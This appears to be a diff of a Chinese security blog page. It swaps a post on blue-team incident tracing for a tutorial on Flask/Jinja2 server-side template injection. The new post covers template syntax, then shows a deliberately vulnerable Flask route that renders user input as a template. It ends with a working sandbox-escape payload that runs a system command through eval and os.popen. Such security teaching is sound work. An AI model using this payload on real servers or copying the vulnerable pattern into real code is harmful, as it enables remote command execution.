@@ -6,7 +6,7 @@
         <meta content="black" name="apple-mobile-web-app-status-bar-style"/>
         <meta content="telephone=no" name="format-detection"/>
         <meta name="renderer" content="webkit">
-    <title>蓝队溯源分析之新手养成记 | P1and</title>
+    <title>Flask/jinjia2模板语法注入 | P1and</title>
 <link href="https://p1and.github.io/styles/main.css" type="text/css" rel="stylesheet"/>
 <script type="text/javascript" src="https://p1and.github.io/media/scripts/jquery.js"></script>
 <script type="text/javascript" src="https://p1and.github.io/media/scripts/basic.js"></script>
@@ -138,7 +138,7 @@
 
 <div class="post">
   <div class="post_title sm_margin">
-    <h2><a>蓝队溯源分析之新手养成记</a>
+    <h2><a>Flask/jinjia2模板语法注入</a>
 
 
 
@@ -147,7 +147,7 @@
 
   <div class="post_details">
     <div class="info"><i class="fa fa-clock-o"></i>
-<span class="date_info">2021-06-17</span>
+<span class="date_info">2021-07-05</span>
 <i class="fa fa-eye"></i>
 
 <span class="date_info"><span id="busuanzi_value_page_pv"></span> Views</span>
@@ -156,7 +156,7 @@
 <i class="fa fa-bookmark-o"></i>
 <span class="tags_info weaklink">
 	
-	<a href="https://p1and.github.io/EBBSIXiTw/" class="tag">原创</a>
+	<a href="https://p1and.github.io/Epc1StIPf/" class="tag">python</a>
 
 
 </span>
@@ -171,39 +171,173 @@
 
 
   <div class="post_content markdown"><p class="md_block">
-    <span class="md_line md_line_start md_line_end"><p>作为<s>唱跳</s>工作将近三年的<s>优秀</s>安服小学生，因为所处团队关系，经常在应急，所以对应急有一乃乃的经验。<br>
-#溯源入门</p>
-<pre><code>对于新手来说，最好刚开始接触那种“最幸福”的事件：
-1、日志齐全。别管它是应用日志还是服务器日志，突出的就是一个全字；
-2、设备齐全。公司家大业大，能够把该上的安全设备都上了，就是一个字“壕”；
-3、样本齐全。此处的样本指的是恶意文件，木马等，我可以根据这个最后结果一步步进行反推。
+    <span class="md_line md_line_start md_line_end"><p>Flask 是一个微型的 Python 开发的 Web 框架，基于Werkzeug WSGI工具箱和Jinjia2 模板引擎。<br>
+例如写一个Hello,word：</p>
+<pre><code>from flask import Flask
+app = Flask(__name__)
+@app.route(&quot;/&quot;)
+def hello():    
+    return &quot;Hello,World!&quot;
+ 
+if __name__ == &quot;__main__&quot;:
+    app.run()
 </code></pre>
-<p>#溯源步骤<br>
-对于上述情况，你在溯源分析中可真是遇见最舒服的事情了，偷偷的笑吧。有着最强大的线索——样本文件，你可以根据文件名字来进行反推。</p>
-<pre><code>1、要注意“大小马”大多数是可以先从应用日志进行查找；
-2、恶意文件大多数可以先从系统日志进行查找；
-3、对于登陆情况可以先排查异常情况下登陆成功的，之后再结合登陆失败的一起进行筛选；
-4、最便于梳理，也是最便于客户看的是一张黑客攻击的流程图，提现三要素（时间，IP，做了什么事情）
-5、千万千万学会用正则，用了正则，妈妈再也不担心我进行溯源分析了；
-6、工欲善其事，必先利其器，找到适合自己的文本分析工具，譬如：我喜欢用Sublime Text、我老大喜欢用UltraEdit，我同事喜欢用notepad等等，看自己那个顺手用哪个。
+<h3 id="模板">模板</h3>
+<p>模板在web开发中广泛使用，它能够有效的将业务逻辑和页面逻辑分开，使代码可读性增强、并且更加容易理解和维护。<br>
+模板简单来说就是一个其中包涵占位变量表示动态的部分的文件，模板文件在经过动态赋值后，返回给用户。<br>
+Python自带的模板功能极其有限，如果我们想要在模板中使用控制语句，和表达式，以及继承等功能的话，就无法实现了。目前主流的模板系统，最常用的就是jinja2和mako</p>
+<h3 id="jinjia2">jinjia2</h3>
+<p>jinja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持。</p>
+<h4 id="基本语法">基本语法</h4>
+<p>在jinjia2中存在三种语法：</p>
+<pre><code>1、控制结构{%%}
+2、变量取值
+3、注释{##}
 </code></pre>
-<p>但是大多数情况下，日志肯定不会那么齐全，或许是黑客删除，或许是应急单位留存不够等等各种各样的情况，兄弟们，不要慌，勇敢的面对它，奥利给。</p>
-<pre><code> 1、对于日志缺失的应急事件，你要找到那个源点，比如：篡改就是有文件，入侵是哪个漏洞，挂马就是大小马等等。
-2、与红队攻击不同，我们蓝队做的是反推，根据入侵者留下的痕迹按图索骥，所以必须找到关键点，把每个点窜在一起就是入侵者的攻击线路。
+<h4 id="过滤器">过滤器</h4>
+<p>变量可以通过“过滤器”进行修改，过滤器可以理解为是jinja2里面的内置函数和字符串处理函数。</p>
+<table>
+<thead>
+<tr>
+<th>过滤器名称</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>safe</td>
+<td>渲染时值不转义</td>
+</tr>
+<tr>
+<td>capitialize</td>
+<td>把值的首字母转换成大写，其他子母转换为小写</td>
+</tr>
+<tr>
+<td>lower</td>
+<td>把值转换成小写形式</td>
+</tr>
+<tr>
+<td>upper</td>
+<td>把值转换成大写形式</td>
+</tr>
+<tr>
+<td>title</td>
+<td>把值中每个单词的首字母都转换成大写</td>
+</tr>
+<tr>
+<td>trim</td>
+<td>把值的首尾空格去掉</td>
+</tr>
+<tr>
+<td>striptags</td>
+<td>渲染之前把值中所有的HTML标签都删掉</td>
+</tr>
+<tr>
+<td>join</td>
+<td>拼接多个值为字符串</td>
+</tr>
+<tr>
+<td>replace</td>
+<td>替换字符串的值</td>
+</tr>
+<tr>
+<td>round</td>
+<td>默认对数字进行四舍五入，也可以用参数进行控制</td>
+</tr>
+<tr>
+<td>Int</td>
+<td>把值转换成整型</td>
+</tr>
+</tbody>
+</table>
+<p>那么如何使用这些过滤器呢？ 只需要在变量后面使用管道(|)分割，多个过滤器可以链式调用，前一个过滤器的输出会作为后一个过滤器的输入。</p>
+<pre><code># Abc
+{{ 'abc' | captialize  }}
+
+# ABC
+{{ 'abc' | upper  }}
+
+# Hello World
+{{ 'hello world' | title  }}
+
+# HELLO DAXIN
+{{ &quot;hello world&quot; | replace('world','daxin') | upper }}
+
+ # 18
+{{ 18.18 | round | int }}
 </code></pre>
-<p>#技巧<br>
-##关键点</p>
-<pre><code>1、可以在入侵服务器上查找大小马，篡改文件等；我记得在对某企业进行溯源时，查找的就是某黑客特有的篡改网页的标志，当时是在网站源码上查找被上传并篡改的图片，然后在日志中进行查找这个特有的点；
-2、可以看下被入侵的是什么系统，能够拿shell的漏洞有什么；我记得在对某单位进行溯源时，该单位的网络管理员不知道用的什么CMS，而且网站因为影响已经关闭，当时是在FOFA上找到了该网站用的漏洞，然后正好此CMS有远程命令执行，在支离破碎未被删除的日志中的确找到了该漏洞利用；
-3、对于受害单位有很多网络资产与系统，并且有数据泄漏，大概率可以从API接口入手；我记得在对某企业进行溯源时，该单位每日产生的流量有十几个G，网络资产梳理了一天还没给到结果，日志也被删除，幸亏当时该企业上了探针，记录有数据，最后的结果的确是从API接口泄漏的；
+<h4 id="for循环">for循环</h4>
+<p>jinja2中的for循环用于迭代Python的数据类型，包括列表，元组和字典。在jinja2中不存在while循环。<br>
+for循环的使用方式和Python比较类似，但是没有了句尾的冒号，另外需要使用endfor最为结尾，其实在jinja2中，if也是一样的，结尾需要使用endif。</p>
+<h5 id="迭代列表">迭代列表</h5>
+<pre><code>&lt;ul&gt;
+{% for l_list in lists %}
+&lt;li&gt;{{ l_list|title }}&lt;/li&gt;
+{% endfor %}
+&lt;/ul&gt;
 </code></pre>
-<p>##正则<br>
-兄弟们相信我，正则是真的好用：<br>
-<img src="https://p1and.github.io/post-images/1624602251708.png" alt="" loading="lazy"><br>
-IPV4表达式：<br>
-<code>((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}</code><br>
-身份证号(15位、18位数字)，最后一位是校验位，可能为数字或字符X：<br>
-<code>(^\d{15}$)|(^\d{18}$)|(^\d{17}(\d|X|x)$)</code></p>
+<h5 id="迭代字典">迭代字典</h5>
+<pre><code>&lt;dl&gt;
+{% for key, value in my_dict.items() %}
+&lt;dt&gt;{{ key }}&lt;/dt&gt;
+&lt;dd&gt;{{ value}}&lt;/dd&gt;
+{% endfor %}
+&lt;/dl&gt;
+</code></pre>
+<h4 id="宏">宏</h4>
+<p>宏类似于Python中的函数，我们在宏中定义行为，还可以进行传递参数，可以类比为python的函数。<br>
+在宏中定义一个宏的关键字是macro，后面跟其宏的名称和参数等</p>
+<pre><code># 参数age的默认值为18
+{% macro input(name,age=18) %}
+ 
+ &lt;input type='text' name=&quot;{{ name }}&quot; value=&quot;{{ age }}&quot; &gt;
+ 
+{% endmacro %}
+</code></pre>
+<p>调用方法也和Python的类似：</p>
+<pre><code>&lt;p&gt;{{ input('daxin') }} &lt;/p&gt;
+&lt;p&gt;{{ input('daxin',age=20) }} &lt;/p&gt;
+</code></pre>
+<h3 id="模板注入">模板注入</h3>
+<p>就是模板可被外部控制，任意修改模板输入内容，可被任意构造执行Python内部函数并执行系统命令。Emmmm....可以类比为SQL注入。</p>
+<pre><code>from flask import Flask, request
+from jinja2 import Template
+
+app = Flask(__name__)
+
+@app.route(&quot;/&quot;)
+def index():
+    name = request.args.get('name', 'guest')
+    t = Template(&quot;Hello &quot; + name)
+    return t.render()
+
+if __name__ == &quot;__main__&quot;:
+    app.run()
+</code></pre>
+<p>例如上述代码，程序中通过GET方法参数name 获取值，并将值给变量name ，之后将name直接渲染输出<br>
+此时参数name未进行任何防护，可被任意操控。<br>
+如 访问 http://127.0.0.1:5000/?name={{7*8}}<br>
+{{7*8}}被执行并且输出<br>
+<img src="https://p1and.github.io/post-images/1625729105609.png" alt="" loading="lazy"><br>
+通过jinjia2模板语法+python沙盒逃逸可以构造相应的poc<br>
+官方：</p>
+<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.__globals__.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('__import__(&quot;os&quot;).popen(&quot;id&quot;).read()') }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://p1and.github.io/post-images/1625729114261.png" alt="" loading="lazy"></figure>
+<h3 id="参考">参考</h3>
+<p>https://vulhub.org/<br>
+https://www.runoob.com/<br>
+https://www.jianshu.com/p/d92d98607df2</p>
 </p>
 
      <p class="md_block">
